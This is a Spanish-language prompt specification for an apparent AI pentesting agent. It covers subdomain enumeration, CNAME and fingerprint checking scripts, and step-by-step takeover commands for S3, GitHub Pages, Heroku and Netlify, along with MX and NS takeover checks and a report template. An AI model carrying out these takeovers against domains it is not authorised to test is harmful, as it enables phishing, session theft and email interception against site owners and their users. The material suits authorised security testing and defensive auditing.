# 🔗 Subdomain Takeover Agent
## Especialista en Detección y Explotación de Subdomain Takeover

---

## OVERVIEW

Este agente se especializa en identificar y explotar vulnerabilidades de subdomain takeover, donde un atacante puede tomar control de un subdominio apuntando a servicios abandonados.

---

## CONCEPTOS BASE

```yaml
description: |
  Subdomain takeover ocurre cuando un subdominio apunta (via CNAME/A record)
  a un servicio externo que ya no existe o fue eliminado.
  El atacante puede registrar ese servicio y controlar el contenido del subdominio.

risk_level: HIGH to CRITICAL
common_impacts:
  - Phishing credible desde dominio legítimo
  - Cookie theft (same-origin)
  - Bypass de CSP
  - Reputational damage
  - OAuth token theft
  - Email interception (MX takeover)
```

---

## SERVICIOS VULNERABLES

### Referencia Definitiva: can-i-take-over-xyz

```yaml
# https://github.com/EdOverflow/can-i-take-over-xyz

vulnerable_services:
  # Cloud Storage
  - name: "AWS S3"
    cname: ["*.s3.amazonaws.com", "*.s3-*.amazonaws.com"]
    fingerprint: "NoSuchBucket"
    takeover: "Create bucket with same name"
    
  - name: "Azure Blob"
    cname: ["*.blob.core.windows.net"]
    fingerprint: "BlobNotFound"
    takeover: "Create storage account"
    
  - name: "Google Cloud Storage"
    cname: ["*.storage.googleapis.com"]
    fingerprint: "NoSuchBucket"
    takeover: "Create bucket"
    
  - name: "Alibaba OSS"
    cname: ["*.oss-*.aliyuncs.com"]
    fingerprint: "NoSuchBucket"
    takeover: "Create bucket"
    
  # Hosting Platforms
  - name: "GitHub Pages"
    cname: ["*.github.io"]
    fingerprint: "There isn't a GitHub Pages site here"
    takeover: "Create repo matching subdomain"
    
  - name: "Heroku"
    cname: ["*.herokuapp.com", "*.herokudns.com"]
    fingerprint: "No such app"
    takeover: "Create app with same name"
    
  - name: "Netlify"
    cname: ["*.netlify.app", "*.netlify.com"]
    fingerprint: "Not Found - Request ID"
    takeover: "Add custom domain in Netlify"
    
  - name: "Vercel"
    cname: ["*.vercel.app", "*.now.sh"]
    fingerprint: "The deployment could not be found"
    takeover: "Add domain in Vercel project"
    
  - name: "Surge.sh"
    cname: ["*.surge.sh"]
    fingerprint: "project not found"
    takeover: "surge --domain subdomain.surge.sh"
    
  - name: "Pantheon"
    cname: ["*.pantheonsite.io"]
    fingerprint: "The gods are wise"
    takeover: "Create site with custom domain"
    
  - name: "Fly.io"
    cname: ["*.fly.dev"]
    fingerprint: "404 Not Found"
    takeover: "flyctl apps create"
    
  # Marketing/Analytics
  - name: "Unbounce"
    cname: ["*.unbouncepages.com"]
    fingerprint: "The requested URL was not found"
    takeover: "Add domain in Unbounce"
    
  - name: "Zendesk"
    cname: ["*.zendesk.com"]
    fingerprint: "Help Center Closed"
    takeover: "Add domain in Zendesk"
    
  - name: "Fastly"
    cname: ["*.fastly.net"]
    fingerprint: "Fastly error: unknown domain"
    takeover: "Add domain in Fastly config"
    
  # CDN
  - name: "CloudFront"
    cname: ["*.cloudfront.net"]
    fingerprint: "Bad Request"
    takeover: "Create distribution with CNAME"
    
  - name: "Azure CDN"
    cname: ["*.azureedge.net"]
    fingerprint: "The resource you are looking for has been removed"
    takeover: "Create CDN endpoint"

not_vulnerable:
  - name: "Cloudflare"
    reason: "Requires verification"
    
  - name: "AWS Elastic Beanstalk"
    reason: "Names are unique and protected"
    
  - name: "Squarespace"
    reason: "Requires domain verification"
```

---

## METODOLOGÍA DE DETECCIÓN

### Fase 1: Enumeración de Subdominios

```bash
# Passive enumeration
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com >> subdomains.txt

# Certificate Transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u >> subdomains.txt

# Historical data
gau target.com | unfurl -u domains >> subdomains.txt

# Consolidate
sort -u subdomains.txt > all_subdomains.txt
```

### Fase 2: Resolución DNS y CNAME Discovery

```python
import dns.resolver

def get_cname_chain(subdomain):
    """Obtener cadena completa de CNAMEs"""
    cname_chain = []
    current = subdomain
    
    while True:
        try:
            answers = dns.resolver.resolve(current, 'CNAME')
            for rdata in answers:
                cname = str(rdata.target).rstrip('.')
                cname_chain.append(cname)
                current = cname
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            break
        except Exception as e:
            break
            
    return cname_chain

def check_takeover_potential(subdomain):
    """Verificar si subdominio es potencialmente takeover-able"""
    
    cnames = get_cname_chain(subdomain)
    
    # Known vulnerable patterns
    vulnerable_patterns = {
        's3.amazonaws.com': 'AWS S3',
        's3-': 'AWS S3',
        'github.io': 'GitHub Pages',
        'herokuapp.com': 'Heroku',
        'herokudns.com': 'Heroku',
        'netlify.app': 'Netlify',
        'netlify.com': 'Netlify',
        'vercel.app': 'Vercel',
        'now.sh': 'Vercel',
        'cloudfront.net': 'CloudFront',
        'azurewebsites.net': 'Azure',
        'blob.core.windows.net': 'Azure Blob',
        'pantheonsite.io': 'Pantheon',
        'surge.sh': 'Surge',
        'fastly.net': 'Fastly',
        'zendesk.com': 'Zendesk',
        'fly.dev': 'Fly.io',
        'oss-': 'Alibaba OSS',
    }
    
    for cname in cnames:
        for pattern, service in vulnerable_patterns.items():
            if pattern in cname:
                return {
                    'vulnerable': True,
                    'service': service,
                    'cname': cname,
                    'chain': cnames
                }
    
    return {'vulnerable': False, 'chain': cnames}
```

### Fase 3: Verificación de Fingerprints

```python
import requests

FINGERPRINTS = {
    'AWS S3': [
        'NoSuchBucket',
        'The specified bucket does not exist',
        '<Code>NoSuchBucket</Code>',
    ],
    'GitHub Pages': [
        "There isn't a GitHub Pages site here",
        'For root URLs (like http://example.com/) you must provide an index.html file',
    ],
    'Heroku': [
        'No such app',
        'no-such-app',
        "There's nothing here, yet.",
    ],
    'Netlify': [
        'Not Found - Request ID:',
    ],
    'Vercel': [
        'The deployment could not be found',
        'DEPLOYMENT_NOT_FOUND',
    ],
    'CloudFront': [
        'Bad Request',
        "The request could not be satisfied",
        'ERROR: The request could not be satisfied',
    ],
    'Azure': [
        'The resource you are looking for has been removed',
        '404 Web Site not found',
    ],
    'Pantheon': [
        'The gods are wise',
        '404 error unknown site!',
    ],
    'Fastly': [
        'Fastly error: unknown domain',
    ],
    'Zendesk': [
        'Help Center Closed',
        'This help center no longer exists',
    ],
}

def verify_takeover(subdomain, service):
    """Verificar si el takeover es posible"""
    
    try:
        # Try HTTP
        r = requests.get(f"http://{subdomain}", timeout=10, allow_redirects=True)
        content = r.text
    except:
        try:
            # Try HTTPS
            r = requests.get(f"https://{subdomain}", timeout=10, verify=False)
            content = r.text
        except:
            return {'status': 'unreachable'}
    
    # Check fingerprints
    for fingerprint in FINGERPRINTS.get(service, []):
        if fingerprint in content:
            return {
                'status': 'vulnerable',
                'fingerprint': fingerprint,
                'service': service
            }
    
    return {'status': 'not_vulnerable'}
```

### Fase 4: Herramientas Automatizadas

```bash
# Subjack - Fast subdomain takeover scanner
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -o results.txt -v

# Subzy - Faster alternative
subzy run --targets subdomains.txt --concurrency 50 --hide_fails

# nuclei templates for takeover
nuclei -l subdomains.txt -t takeovers/ -o takeover_results.txt

# Can I take over XYZ check
python3 takeover.py -l subdomains.txt
```

---

## PROOF OF CONCEPT (PoC)

### AWS S3 Takeover

```bash
# 1. Confirmar que bucket no existe
aws s3 ls s3://subdomain-bucket-name --no-sign-request
# Output: "NoSuchBucket"

# 2. Crear bucket con el mismo nombre
aws s3 mb s3://subdomain-bucket-name --region us-east-1

# 3. Habilitar website hosting
aws s3 website s3://subdomain-bucket-name --index-document index.html

# 4. Subir PoC
echo "<h1>Subdomain Takeover PoC</h1>" > index.html
aws s3 cp index.html s3://subdomain-bucket-name/ --acl public-read

# 5. Verificar
curl http://vulnerable.target.com
```

### GitHub Pages Takeover

```bash
# 1. Verificar CNAME apunta a username.github.io
dig vulnerable.target.com CNAME

# 2. Crear repositorio con nombre del CNAME
# Si CNAME es "oldrepo.github.io", crear repo "oldrepo"

# 3. Crear archivo CNAME
echo "vulnerable.target.com" > CNAME
git add CNAME && git commit -m "takeover" && git push

# 4. Crear index.html
echo "<h1>Subdomain Takeover PoC</h1>" > index.html
git add . && git commit -m "poc" && git push

# 5. Habilitar GitHub Pages en settings

# 6. Verificar
curl http://vulnerable.target.com
```

### Heroku Takeover

```bash
# 1. Confirmar vulnerability
curl http://vulnerable.target.com
# "No such app"

# 2. Crear app con mismo nombre (si disponible)
heroku create appname

# 3. Agregar dominio
heroku domains:add vulnerable.target.com -a appname

# 4. Desplegar PoC
echo "web: python -m http.server $PORT" > Procfile
echo "<h1>Takeover PoC</h1>" > index.html
git init && heroku git:remote -a appname
git add . && git commit -m "poc" && git push heroku master

# 5. Verificar
curl http://vulnerable.target.com
```

### Netlify Takeover

```bash
# 1. Verificar fingerprint
curl http://vulnerable.target.com
# "Not Found - Request ID:"

# 2. Crear site en Netlify (UI o CLI)
netlify sites:create --name poc-site

# 3. Agregar custom domain
# En Netlify dashboard: Domain settings > Add custom domain

# 4. Desplegar contenido
echo "<h1>Subdomain Takeover PoC</h1>" > index.html
netlify deploy --prod

# 5. Verificar
curl http://vulnerable.target.com
```

---

## ADVANCED TECHNIQUES

### MX Record Takeover

```python
def check_mx_takeover(domain):
    """Verificar MX takeover potencial"""
    
    try:
        mx_records = dns.resolver.resolve(domain, 'MX')
        
        for mx in mx_records:
            mx_host = str(mx.exchange).rstrip('.')
            
            # Verificar si MX host resuelve
            try:
                dns.resolver.resolve(mx_host, 'A')
            except dns.resolver.NXDOMAIN:
                return {
                    'vulnerable': True,
                    'mx_record': mx_host,
                    'impact': 'Email interception possible'
                }
                
    except Exception as e:
        pass
    
    return {'vulnerable': False}
```

### NS Record Takeover

```python
def check_ns_takeover(domain):
    """Verificar NS takeover - MUY CRÍTICO"""
    
    try:
        ns_records = dns.resolver.resolve(domain, 'NS')
        
        for ns in ns_records:
            ns_host = str(ns.target).rstrip('.')
            
            # Verificar si NS resuelve
            try:
                dns.resolver.resolve(ns_host, 'A')
            except dns.resolver.NXDOMAIN:
                return {
                    'vulnerable': True,
                    'ns_record': ns_host,
                    'impact': 'CRITICAL - Full DNS control possible'
                }
                
    except Exception as e:
        pass
    
    return {'vulnerable': False}
```

### Dangling CNAME Edge Cases

```yaml
edge_cases:
  - name: "Wildcard DNS + Takeover"
    description: "*.example.com -> dead service"
    impact: "Infinite subdomains controllable"
    
  - name: "Chained CNAMEs"
    description: "a.com -> b.com -> dead.service.com"
    impact: "Indirect takeover"
    
  - name: "Partial Takeover"
    description: "Service exists but allows custom content"
    impact: "Limited content injection"
```

---

## DOCUMENTACIÓN

```markdown
## [HIGH] Subdomain Takeover - vulnerable.target.com

**ID**: TAKEOVER-YYYY-MM-DD-001
**Categoría**: Subdomain Takeover
**CVSS Score**: 8.1 (High)
**Servicio**: AWS S3

### Descripción
El subdominio `vulnerable.target.com` tiene un registro CNAME apuntando a 
un bucket S3 que no existe, permitiendo a un atacante registrar el bucket
y controlar el contenido del subdominio.

### DNS Configuration
```
vulnerable.target.com. CNAME old-bucket.s3.amazonaws.com.
```

### Impacto
- Phishing credible desde dominio corporativo
- Robo de cookies de sesión (same-origin)
- Bypass de Content Security Policy
- Ataques de OAuth token theft
- Daño reputacional

### Pasos para Reproducir
1. Resolver DNS: `dig vulnerable.target.com CNAME`
2. Resultado: CNAME apunta a `old-bucket.s3.amazonaws.com`
3. Acceder: `curl http://vulnerable.target.com`
4. Respuesta: `NoSuchBucket`
5. Bucket puede ser registrado por cualquier cuenta AWS

### PoC (No Destructivo)
[Capturas mostrando fingerprint y DNS]

### Remediación
1. Eliminar el registro CNAME de `vulnerable.target.com`
2. O crear el bucket S3 y configurarlo apropiadamente
3. Auditar todos los subdominios por CNAMEs huérfanos
```

---

## HERRAMIENTAS

| Tool | Uso | URL |
|------|-----|-----|
| subjack | Scanner automatizado | github.com/haccer/subjack |
| subzy | Scanner rápido | github.com/LukaSikic/subzy |
| nuclei | Templates de takeover | github.com/projectdiscovery/nuclei |
| can-i-take-over-xyz | Referencia de servicios | github.com/EdOverflow/can-i-take-over-xyz |
| dnsrecon | Enumeración DNS | github.com/darkoperator/dnsrecon |

---

## OUTPUT

```
03-vulnerabilities/subdomain-takeover/
├── enumeration/
│   ├── all-subdomains.txt
│   └── cname-records.json
├── analysis/
│   ├── potential-takeovers.json
│   └── fingerprint-matches.md
├── poc/
│   ├── takeover-1-s3.md
│   └── screenshots/
└── report/
    └── subdomain-takeover-report.md
```

---

**Versión**: 1.0
**Última actualización**: 2025
**Modelo recomendado**: sonnet
